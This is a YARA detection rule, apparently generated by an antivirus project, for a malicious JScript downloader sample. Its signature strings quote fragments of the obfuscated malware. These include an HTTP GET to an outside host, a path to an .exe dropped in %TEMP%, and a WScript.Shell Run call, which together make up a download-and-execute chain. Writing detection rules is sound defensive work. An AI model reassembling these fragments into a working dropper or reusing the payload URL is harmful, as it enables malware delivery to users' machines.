rule sig_20160328_02575ef7a1fc0d0b796ad1d6bae4a15a {
  meta:
    description = "datamaliciousorder - file 20160328_02575ef7a1fc0d0b796ad1d6bae4a15a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7f16a10bb4be52abb5e11d3b18fde298b48207091d19df3924beaeb32670503c"

  strings:
    $s1  = "function Btzra() {return Tbgai[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4KhSH5ACZDke0eC.exe\";};" fullword ascii
    $s2  = "do {WScript[Sygbt](Rdarwrtvs() * 11)} while (Rfsft[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Yrwtaqqa(Bfbzy, Zyybeec){return Bfbzy - Zyybeec;};" fullword ascii
    $s4  = "var Tbgai = function Uvmmfrr() {return WScript[Xfvierti](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Rfsft[Unsgaopst](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s6  = "function Npywnnty() {return ((Ktmojxzd == true) && (Ktmojxzd == Hlknchx)) ? 1 : Zctxteekid;};" fullword ascii
    $s7  = "function Ubmjnod(Vzvrp){Tbgai[\"Run\"](Vzvrp, Zctxteekid, Zctxteekid);};" fullword ascii
    $s8  = "Hlknchx = true; " fullword ascii
    $s9  = "function Gkopkpt(Qmgowfm) {var Xesups = (1, 2, 3, 4, 5, Qmgowfm); return Xesups;};" fullword ascii
    $s10 = "var Pconrcqyq = false;" fullword ascii
    $s11 = "function Cnjlvcs()" fullword ascii
    $s12 = "return Yrwtaqqa(Ixxvfc, Eihrc);" fullword ascii
    $s13 = "var Hlknchx = false;" fullword ascii
    $s14 = "function Ejkmjkyx(){return Xfvierti;};" fullword ascii
    $s15 = "var Ktmojxzd = false;" fullword ascii
    $s16 = "function Rdarwrtvs(){return 22;};" fullword ascii
    $s17 = "Ktmojxzd = true; " fullword ascii
    $s18 = " while (Fnjbf){" fullword ascii
    $s19 = "var Byyzwn = new this[\"Date\"]();" fullword ascii
    $s20 = "function Mdibdhnatm(){return Zxdhrt;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}